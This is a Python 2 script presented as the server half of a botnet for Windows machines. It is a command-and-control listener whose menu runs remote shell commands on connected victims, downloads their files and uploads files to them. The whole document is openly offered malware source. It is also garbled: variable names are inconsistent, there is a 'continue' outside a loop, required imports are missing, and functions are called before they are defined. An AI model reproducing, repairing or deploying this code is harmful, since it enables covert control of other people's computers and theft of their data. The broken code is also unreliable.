# Make Botnet on Windows Machines with Python (server)
# Requirements:
# - Python 2.7
# - Ctypes Python Library
# - Sockets Python Library
# - Json Python Library
# - Subprocess Python Library
# - WMI Python Library

#---------------------------------------------------------------------------------------------------
# server to connect devices through ports, with 3 features
import socket

newsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
newsocket.bind((<IP>, <PORT>)) 
newsocket.listen(1000)

while True:
    try:
        connection, address = newSocket.accept()
        finish_flag = True 
 
        while finish_flag: 
            option = int(getInfo()) 
 
            if option == 1: 
                executeRemoteCommand(connection) 
            
            elif option == 2: 
                downloadFile(connection) 
 
            elif option == 3: 
                uploadFile(connection) 
 
            elif option == 4: 
                finish_flag = False
    
    except Exception:
        break
    
    finally:
        newsocket.close()
#---------------------------------------------------------------------------------------------------


#---------------------------------------------------------------------------------------------------
# funktion to choose feature
def getInfo():

    flag = True 
    while flag: 
        print "Usage information: " 
        print "1. Execute remote commands." 
        print "2. Download some file from remote computer." 
        print "3. Upload some file to remote computer from server." 
        print "4. Exit" 

    option = raw_input('Enter option: ') 
    try: 
        if 1 <= int(option) <= 4: 
            flag = False 

        else: print "Introduce option number between 1-3"
        
    except Exception: 
        continue 
 
    return option
#---------------------------------------------------------------------------------------------------


#---------------------------------------------------------------------------------------------------
# implemented download file feature 
def downloadFile(connection): 
 
    path_remote = raw_input("Enter remote path: ") 
 
    #send action 
    action = json.dumps({"action": "download", "path": path_remote})
    connection.send(action) 
 
    #get filesize 
    datasize = connection.recv(2048) 
    filesize = int(datasize) 
 
    #get filename 
    filepath = os.path.basename(path_remote) 

    #receive data 
    try: 
        datareceive = [] 
        received = 0 
 
        # will read while both size are differents 
        while filesize > received: 
            data = connection.recv(min(filesize - received, 2048)) 
            datareceive.append(data) 
            received += len(data) 
 
        # write received file 
        file_to_write = open(os.path.join(<directory_to_save>, filepath), 'wb') 
        file_to_write.write(''.join(datareceive)) 
        file_to_write.close() 
 
    except Exception as error: 
        print error
#---------------------------------------------------------------------------------------------------

#---------------------------------------------------------------------------------------------------
# implemented upload file feature 
def uploadFile(connection): 
 
    path_upload = raw_input("Enter upload filename: ") 
 
    try: 
        if os.path.exists(path_upload): 
 
            #send action 
            action = json.dumps({"action": "upload", "path": path_upload})
            Connection.send(action) 
 
            time.sleep(2) 
 
            #get filesize 
            send_data = open(path_upload, 'rb').read() 
            length = len(send_data) 
 
            #send filesize 
            connection.sendall(str(length)) 
 
            totalsent = 0

            while totalsent < len(send_data): 
                sent = connection.send(send_data[totalsent:]) 
                totalsent += sent 
 
    except Exception as error: 
        print error
#---------------------------------------------------------------------------------------------------

#---------------------------------------------------------------------------------------------------
# implemented remotely execute a command feature 
def executeRemoteCommand(connection): 
 
    print "Welcome to remote shell" 
    print "Enter your commands" 
 
    while True: 
        #send action 
        action = json.dumps({"action": "command", "path": ""}) 
        Connection.send(action) 
 
        cmd = raw_input(">> ") 
 
        if cmd == "quit":
            break 
 
        elif cmd: 
            connection.send(cmd) 
            connection.setblocking(0) 
            full_data = [] 
            data_receive = "" 
            begin = time.time() 
            timeout = 1 
 
            #Receive
            while True: 
                if full_data and time.time()-begin > timeout: 
                    break 
 
                try: 
                    data_receive = connection.recv(8192) 
                    
                    if data_receive: 
                        full_data.append(data_receive) 
                        begin = time.time() 
                    
                    else:
                        time.sleep(0.1) 

                except: 
                    pass 
 
            data = "".join(full_data) 
            print data
 
            pressToContinue = raw_input('Press to continue ...') 
            Connection.setblocking(1) 
#---------------------------------------------------------------------------------------------------